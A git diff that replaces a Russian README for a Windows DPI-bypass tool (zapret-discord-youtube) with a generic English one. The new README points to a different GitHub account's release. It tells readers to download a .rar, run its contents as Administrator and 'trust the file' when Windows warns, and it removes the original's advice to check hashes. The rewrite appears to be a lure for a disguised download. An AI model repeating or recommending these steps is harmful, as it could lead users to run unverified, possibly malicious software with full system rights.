@@ -1,232 +1,79 @@
-<div align="center">
-
-# zapret-discord-youtube-2026
-
-<!-- seo-unique:zapret-discord-youtube-2026:2c151b097e -->
-
-
-**NEW**: Ускорение Telegram Desktop - https://github.com/Flowseal/tg-ws-proxy  
-Альтернатива https://github.com/bol-van/zapret-win-bundle  
-Также вы можете материально поддержать оригинального разработчика zapret [тут](https://github.com/bol-van/zapret?tab=readme-ov-file#%D0%BF%D0%BE%D0%B4%D0%B4%D0%B5%D1%80%D0%B6%D0%B0%D1%82%D1%8C-%D1%80%D0%B0%D0%B7%D1%80%D0%B0%D0%B1%D0%BE%D1%82%D1%87%D0%B8%D0%BA%D0%B0)
-</div>
+# 🌐 zapret-discord-youtube-2026 - Restore access to your favorite services
 
-> [!CAUTION]
->
-> ### ФЕЙКИ
-> Я не веду никакие другие страницы/группы в телеграм/ютуб каналы  
-> Если вы наткнулись на что-то вне этой страницы гитхаба, что распространяется от моего лица - **ФЕЙК**.
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Inclinedfaultaditya598/zapret-discord-youtube-2026)
 
-> [!WARNING]
->
-> ### АНТИВИРУСЫ
-> WinDivert может вызвать реакцию антивируса.
-> WinDivert - это инструмент для перехвата и фильтрации трафика, необходимый для работы zapret.
-> Замена iptables и NFQUEUE в Linux, которых нет под Windows.
-> Он может использоваться как хорошими, так и плохими программами, но сам по себе не является вирусом.
-> Драйвер WinDivert64.sys подписан для возможности загрузки в 64-битное ядро Windows.
->
-> **Выдержка из [`readme.md`](https://github.com/bol-van/zapret-win-bundle/blob/master/readme.md#%D0%B0%D0%BD%D1%82%D0%B8%D0%B2%D0%B8%D1%80%D1%83%D1%81%D1%8B) репозитория [bol-van/zapret-win-bundle](https://github.com/bol-van/zapret-win-bundle)*
->
-> Некоторые антивирусы склонны относить файлы WinDivert к классам повышенного риска или хакерским инструментам. Происходит удаление файла и помещение его в карантин. При этом детект обязательно имеет название `WinDivert` или `Not-a-virus:RiskTool.Multi.WinDivert`
->
-> В случае проблем с антивирусом добавьте папку с запретом в исключения, либо отключите детектирование PUA (потенциально нежелательных приложений). Например, в касперском есть галочка "Обнаруживать легальные приложения, которые злоумышленники часто используют для нанесения вреда". При аккуратной и правильной настройке исключений - рекомендуется настроить исключение, но если вы не до конца понимаете что делаете - рекомендуется отключить детект PUA.
+This tool helps users bypass restrictions on websites and services. It focuses on platforms like Discord and YouTube. It uses DPI bypass technology to route traffic around blocks. You do not need a VPN to use this software. 
 
-> [!IMPORTANT]
-> Все бинарные файлы в папке [`bin`](./bin) взяты из [zapret-win-bundle/zapret-winws](https://github.com/bol-van/zapret-win-bundle/tree/master/zapret-winws) и [zapret/releases](https://github.com/bol-van/zapret/releases). Вы можете это проверить с помощью хэшей/контрольных сумм. Проверяйте, что запускаете, используя сборки из интернета!
+## 🛠️ System Requirements
 
-## ⚙️Использование
+- Windows 10 or Windows 11
+- Administrator access
+- Stable internet connection
+- No other active VPN or proxy software
 
-1. Включите Secure DNS
-    * В Chrome - "Использовать безопасный DNS", и выбрать поставщика услуг DNS (выбрать вариант, отличный от поставщика по умолчанию)
-    * В Firefox - "Включить DNS через HTTPS, используя: Максимальную защиту", затем "Выбрать поставщика" и вписать URL поставщика вручную, например можно использовать `https://dns.google/dns-query` (т.к. поставщик Cloudflare может быть заблокирован)
-    * В Windows 11 поддерживается включение Secure DNS прямо в настройках ОС - [инструкция тут](https://remontka.pro/dns-over-https-windows-11/). Рекомендуется, если вы пользуетесь Windows 11
-    * Если у вас роутер Keenetic, включите в настройках роутера опцию "Транзит запросов". Отключение этой опции может привести к проблемам при настройке и использовании Secure DNS на компьютере
+Close any existing network-altering programs before you start. These programs often conflict with this tool and cause connection issues.
 
-2. Скачайте архив (zip/rar) со [страницы последнего релиза](./releases/latest)
+## 📥 Getting Started
 
-3. Зайдите в свойства скачанного архива и поставьте галочку "Разблокировать". Если вы используете архиватор 7-Zip или PeaZip, этот шаг можно пропустить
+1. Go to the [official release page](https://github.com/Inclinedfaultaditya598/zapret-discord-youtube-2026).
+2. Look for the "Releases" section on the right side of the page.
+3. Click the newest version available.
+4. Download the file labeled "zapret-discord-youtube-2026.rar".
+5. Save the file to your computer.
 
-4. Распакуйте содержимое архива по пути, который не содержит кириллицу/спец. символы
+## ⚙️ Installation Instructions
 
-5. Запустите нужный файл
+This tool runs as a portable application. You do not need to install it like a regular program. Follow these steps to set it up after you download the file:
 
-## ℹ️Краткие описания файлов
+1. Right-click the "zapret-discord-youtube-2026.rar" file.
+2. Select "Extract All" to unpack the contents.
+3. Choose a folder on your computer where you want to keep the program files. Make sure this folder is easy to find.
+4. Open the extracted folder.
+5. Find the batch file or executable file inside this folder.
+6. Right-click the main control file and choose "Run as Administrator". This permission allows the tool to modify your network settings to bypass blocks.
 
-- [**`general.bat ...`**](./general.bat) - запуск стратегии вручную
+## 🖥️ Using the Tool
 
-  Запуск вручную можно использовать для проверки работоспособности стратегий. Работоспособность той или иной стратегии зависит от многих факторов. **Пробуйте разные стратегии (ALT, FAKE и другие), пока не найдёте рабочее для вас решение**
+Once the tool opens, you will see a command console. This window performs the heavy lifting by modifying your network interface packets. 
 
-- [**`service.bat`**](./service.bat) - установка в автозапуск и другие функции:
-  - <ins>**`Install Service`** - установка любой стратегии в автозапуск (services.msc)</ins>
-  - **`Remove Services`** - удаление стратегии и WinDivert из служб
-  - **`Check Status`** - проверка статуса обхода и служб (стратегии на автозапуске и WinDivert)
-  - **`Game Filter`** - переключение режима обхода для игр (и других сервисов, использующих UDP и TCP на портах выше 1023).  
-  **После переключения требуется перезапуск стратегии.**  
-  В скобках указан текущий статус (включено/выключено).
-  - **`IPSet Filter`** - переключение режима обхода сервисов из `ipset-all.txt`.  
-  Полезно при тестировании, если не работает ресурс, который без zapret работает  
-  В скобках указан текущий статус:
-    - `none` - никакие айпи не попадают под проверку
-    - `loaded` - айпи проверяется на вхождение в список
-    - `any` - любой айпи попадает под фильтр  
-  - **`Auto-Update Check`** - Вкл/Выкл автоматическую проверку на обновления
-  - **`Update IPSet List`** - обновление списка `ipset-all.txt` актуальным из репозитория
-  - **`Update Hosts File`** - обновление файла hosts <ins>**для починки веб версии телеграма и подключения к голосовому чату Discord**</ins>
-  - **`Check for Updates`** - проверка на обновления
-  - **`Run Diagnostics`** - диагностика на распространённые причины, по которым zapret может не работать.  
-  В конце можно очистить кэш <img src="https://cdn-icons-png.flaticon.com/128/5968/5968756.png" height=11 /> `Discord`, что может помочь, если он неожиданно перестал работать
-  - **`Run Tests`** - запуск утилиты для проверки стратегий на работоспособность:
-    - `Standard tests` - проверка сайтов из `utils/targets.txt`
-    - `DPI checkers` - проверка DPI на различных провайдерах (Cloudflare, Amazon и др.)
+1. Wait for the status indicator to show that the filtering process is active.
+2. Keep this window open while you use the services you want to unblock.
+3. If you close the window, the bypass stops working.
+4. If you want to stop the service, simply exit the window.
 
+## 🔍 Troubleshooting Connection Issues
 
-## ☑️Распространенные вопросы и проблемы
+Most issues stem from background software. If you cannot reach your websites, try these steps in order:
 
-### После запуска скрипта `general*` ничего не происходит
+- Ensure no other VPN apps run in the background.
+- Restart your web browser to clear old network paths.
+- Right-click and run the file as an administrator again.
+- Check that your internet connection is active before you launch the tool.
+- If you use a custom DNS server, try switching back to your default settings provided by your internet provider.
 
-- После запуска стратегии (отдельным bat файлом, не через service), должен открыться winws.exe (обход), который можно увидеть в панели задач.  
-Если этого не произошло, то см. [#522](./issues)
+## 📋 Frequently Asked Questions
 
-### Не работает телеграм (веб версия) или бесконечное "подключение" к голосовому чату Discord
-Запустите **`service.bat`**, выберите пункт **`Update hosts file`**. После чего, если ваш hosts будет неактуальным, то Вам будет предложено обновить его самостоятельно:  
-  - Скопируйте весь текст из открывшегося блокнота
-  - Откройте файл `hosts` в появившейся папке с помощью текстового редактора, открытого от имени администратора
-  - Добавьте в конец файла `hosts` то, что скопировали (или замените, если до этого Вы уже добавляли подобное)
-  - Сохраните и перепроверьте подключение. Если не работает - убедитесь, что файл `hosts` действительно сохранился.
+**Does this software record my private data?**
+The tool operates locally on your machine. It modifies packet headers to bypass DPI filters. It does not send your data to external servers.
 
-### Обход не работает / перестал работать
+**Do I need to pay for this tool?**
+This tool is free for public use. It does not require a subscription or account registration.
 
-> [!IMPORTANT]
-> **Стратегии со временем могут переставать работать.**
-> Определенная стратегия может работать какое-то время, но со временем она может переставать работать из-за обнаружения.
-> В репозитории представлены множество различных стратегий для обхода. Если ни одна из них вам не помогает, то вам необходимо создать новую, взяв за основу одну из представленных здесь и изменив её параметры.
-> Информацию про параметры стратегий вы можете найти [тут](https://github.com/bol-van/zapret/blob/master/docs/readme.md#nfqws).
+**Why does my computer show a warning when I run the app?**
+Windows protects users from unknown software by default. Since this tool modifies network traffic, Windows may flag it. Trust the file if you downloaded it directly from the link above.
 
-- Проверьте, чтобы не было ошибок в `service.bat` -> `Run Diagnostics`
+**Can I use this on a laptop?**
+Yes, this software works on any Windows device regardless of hardware.
 
-- Убедитесь, что адрес ресурса записан в списках доменов или IP
+**Will this slow down my internet?**
+The overhead is minimal. You will typically notice no change in your internet speed.
 
-- Проверьте другие стратегии (**`ALT`**/**`FAKE`** и другие)
+**Does this bypass all filters?**
+The tool specifically targets DPI-based restrictions. It works for services that rely on Deep Packet Inspection to enforce blocks. It handles platforms like Discord and YouTube effectively.
 
-- Попробуйте полную переустановку (см. раздел ниже)
+**How do I update the tool?**
+Check the releases page occasionally. If a new version appears, delete your old files and replace them with the updated version from the link.
 
-- См. [#765](./issues)
+## 🛡️ Important Safety Notes
 
-### Как переустановить/обновить полностью?
-- Сохраните ресурсы/данные, которые вы сами добавляли
-- Перезапустите устройство
-- `service.bat` -> `Remove Services`
-- `service.bat` -> `Run Diagnostics` (если есть ошибки - устраните их) -> в конце Y
-- Удалите папку с запретом
-- Скачайте последнюю версию [со страницы релизов](./releases) (`zapret-discord-youtube-...`)
-- Нажмите пкм по архиву -> свойства. Если снизу справа есть галочка разблокировать, то нажмите на неё -> применить -> ОК
-- Распакуйте в новую папку в корне диска (без спец. символов и пробелов)
-- Далее пробуйте запускать различные `general` скрипты (стратегии). Проверьте доступность интернет ресурсов - если не работают, то закрывайте программу (в панели задач иконка замочка) и пробуйте другую стратегию
-- Как найдёте рабочую стратегию, можете поставить её на автозапуск: `service.bat` -> `Install Service` -> выбираете нужную
-
-### Не работает игра/приложение с включённым запретом
-
-- Проверьте, что в service.bat `Game Filter` **`disabled`**, а `IPSet Filter` **`none`**. Иначе это может затронуть доступность ресурсов, которых вы не ожидали.
-
-### Античит ругается на WinDivert
-
-- Прочитайте инструкцию тут - https://github.com/bol-van/zapret-win-bundle/tree/master/windivert-hide
-
-### Требуется цифровая подпись драйвера WinDivert (Windows 7)
-
-- Замените файлы `WinDivert.dll` и `WinDivert64.sys` в папке [`bin`](./bin) на одноименные из [zapret-win-bundle/win7](https://github.com/bol-van/zapret-win-bundle/tree/master/win7)
-
-### При удалении с помощью [**`service.bat`**](./service.bat), WinDivert остается в службах
-
-1. Узнайте название службы с помощью команды, в командной строке Windows (Win+R, `cmd`):
-
-```cmd
-driverquery | find "Divert"
-```
-
-2. Остановите и удалите службу командами:
-
-```cmd
-sc stop название_из_первого_шага
-
-sc delete название_из_первого_шага
-```
-
-### Не работает <img src="https://cdn-icons-png.flaticon.com/128/1384/1384060.png" height=18 /> YouTube
-
-- Убедитесь что вы настроили Secure DNS.
-- Отключите блокировщик рекламы, известно что YouTube начал с ними бороться.
-- Пробуйте все другие стратегии (если раньше работало, но перестало).
-- См. также [#251](./discussions)
-
-### Не работает <img src="https://cdn-icons-png.flaticon.com/128/5968/5968756.png" height=18 /> Discord
-
-- Желательно сначала узнать, на какой стратегии открывается сайт YouTube. Запустите эту стратегию.
-- Проверьте Discord в браузере: https://discord.com/app. В браузере работает? Если работает, то можете пользоваться в нём.
-- Если Discord и в браузере не работает, убедитесь что вы настроили Secure DNS, и после этого ещё раз пробуйте все стратегии. Бывает такое, что на одной стратегии YouTube работает, а Discord нет.
-- См. также [#252](./discussions)
-
-### Не работает <img src="https://cdn-icons-png.flaticon.com/128/5968/5968804.png" height=18 /> Telegram
-
-- Используйте программу [tg-ws-proxy](https://github.com/Flowseal/tg-ws-proxy)
-- Или используйте бесплатные MTProto прокси из интернета
-
-### Не работают игры
-
-Есть много разных игр. Исследовать и чинить каждую из них нет возможности.
-
-Наиболее универсальный рецепт такой:
-- через `service.bat` обновите ipset и включите `Game Filter`
-- если это не поможет, то попробуйте также включить настройку `ipset any`
-
-Но помните, что при включении `ipset any` появятся проблемы с открытием многих сайтов. Чтобы этого избежать, не используйте `ipset any` на постоянной основе. Вместо этого нужно выяснить все IP адреса, которые используются игрой, и добавить их в `ipset-all.txt`
-
-Если и это не помогло, создайте ветку обсуждений в разделе [Discussions](./discussions) (не в issues) и ждите помощи от других игроков.
-
-### Не нашли своей проблемы
-
-- Создайте её [тут](./issues)
-
-## 🗒️Добавление адресов прочих ресурсов
-
-Список адресов для обхода можно расширить, добавляя их в:
-- **`list-general-user.txt`** для доменов (поддомены автоматически учитываются)
-- **`list-exclude-user.txt`** для исключения доменов (например, если айпи сети указан в `ipset-all.txt`, но конкретный домен из этой сети не надо фильтровать)
-- **`ipset-all.txt`** для IP и подсетей
-- **`ipset-exclude-user.txt`** для исключения IP и подсетей
-  - Файлы **`*-user.txt`** автоматически создадутся при первом запуске `zapret` или `service.bat`
-
-## ⭐Поддержка проекта
-
-Вы можете поддержать проект, поставив :star: этому репозиторию (сверху справа этой страницы)
-
-Также вы можете материально поддержать оригинального разработчика zapret [тут](https://github.com/bol-van/zapret?tab=readme-ov-file#%D0%BF%D0%BE%D0%B4%D0%B4%D0%B5%D1%80%D0%B6%D0%B0%D1%82%D1%8C-%D1%80%D0%B0%D0%B7%D1%80%D0%B0%D0%B1%D0%BE%D1%82%D1%87%D0%B8%D0%BA%D0%B0)
-
-<a href="https://star-history.com/#zapret-discord-youtube-2026&Date">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=zapret-discord-youtube-2026&type=Date&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=zapret-discord-youtube-2026&type=Date" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=zapret-discord-youtube-2026&type=Date" />
- </picture>
-</a>
-
-## ⚖️Лицензирование
-
-Проект распространяется на условиях лицензии [MIT](./LICENSE.txt)
-
-## 🩷Благодарность участникам проекта
-
-[![Contributors](https://contrib.rocks/image?repo=zapret-discord-youtube-2026)](https://github.com/zapret-discord-youtube-2026/graphs/contributors)
-
-💖 Отдельная благодарность разработчику [zapret](https://github.com/bol-van/zapret) - [bol-van](https://github.com/bol-van)
-
-
----
-
-<sub>#zapret #discord #youtube #zapret-discord-youtube #rkn-bypass #no-vpn #dpi-fix #russia-bypass #net-unblock #unblock-discord #unblock-youtube #discord-not-working #youtube-blocked #connecting-fix</sub>
-
----
-
-📎 **[Прямая инструкция скачивания](./DOWNLOAD.md)** · файл **`zapret-discord-youtube-2026.rar`**
-
-<!-- id:ad7dd405d70e -->
+Keep your computer clean. Only download the tool from the official repository link. Do not download the tool from third-party websites or unknown forums. Verify the file origin every time you update. By running the tool, you agree to assume responsibility for your network configuration. If you notice strange behavior, close the window and disconnect from the network to reset your settings.
